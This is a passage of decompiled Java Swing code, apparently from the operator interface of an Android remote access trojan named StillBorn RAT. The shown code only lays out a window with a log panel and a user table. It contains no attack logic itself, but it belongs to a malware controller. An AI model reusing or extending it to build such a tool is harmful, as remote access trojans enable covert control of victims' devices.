/* 727:702 */         GUI.this.buttonAboutActionPerformed();
/* 728:    */       }
/* 729:705 */     });
/* 730:706 */     this.splitPane = new JSplitPane();
/* 731:707 */     this.splitPane.setOrientation(0);
/* 732:    */     
/* 733:709 */     GroupLayout layout = new GroupLayout(getContentPane());
/* 734:710 */     layout.setHorizontalGroup(
/* 735:711 */       layout.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 736:712 */       .addComponent(this.splitPane, GroupLayout.Alignment.TRAILING, -1, 671, 32767));
/* 737:    */     
/* 738:714 */     layout.setVerticalGroup(
/* 739:715 */       layout.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 740:716 */       .addComponent(this.splitPane, GroupLayout.Alignment.TRAILING, -1, 305, 32767));
/* 741:    */     
/* 742:    */ 
/* 743:719 */     this.jScrollPane = new JScrollPane();
/* 744:720 */     this.splitPane.setRightComponent(this.jScrollPane);
/* 745:    */     
/* 746:722 */     this.logPanel = new ColorPane();
/* 747:723 */     this.jScrollPane.setViewportView(this.logPanel);
/* 748:    */     
/* 749:725 */     this.jScrollPane1 = new JScrollPane();
/* 750:726 */     this.splitPane.setLeftComponent(this.jScrollPane1);
/* 751:727 */     this.splitPane.setDividerLocation(200);
/* 752:728 */     this.userTable = new JTable();
/* 753:729 */     this.userTable.setRowMargin(3);
/* 754:730 */     this.userTable.setRowHeight(48);
/* 755:731 */     this.userTable.setFont(new Font("Dialog", 0, 16));
/* 756:732 */     this.userTable.setAutoResizeMode(1);
/* 757:733 */     this.userTable.addMouseListener(new MouseAdapter()
/* 758:    */     {
/* 759:    */       public void mouseClicked(MouseEvent e)
/* 760:    */       {
/* 761:736 */         GUI.this.userMouseClicked(e);
/* 762:    */       }
/* 763:738 */     });
/* 764:739 */     this.jScrollPane1.setViewportView(this.userTable);
/* 765:740 */     getContentPane().setLayout(layout);
/* 766:    */     
/* 767:742 */     pack();
/* 768:    */   }
/* 769:    */   
/* 770:    */   private void centrerTable(JTable table)
/* 771:    */   {
/* 772:745 */     DefaultTableCellRenderer custom = new DefaultTableCellRenderer();
/* 773:746 */     custom.setHorizontalAlignment(0);
/* 774:747 */     this.userTable.getColumnModel().getColumn(0).setPreferredWidth(56);
/* 775:748 */     for (int i = 1; i < table.getColumnCount(); i++) {
/* 776:749 */       table.getColumnModel().getColumn(i).setCellRenderer(custom);
/* 777:    */     }
/* 778:    */   }
/* 779:    */ }



/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar

 * Qualified Name:     gui.GUI

 * JD-Core Version:    0.7.0.1

 */
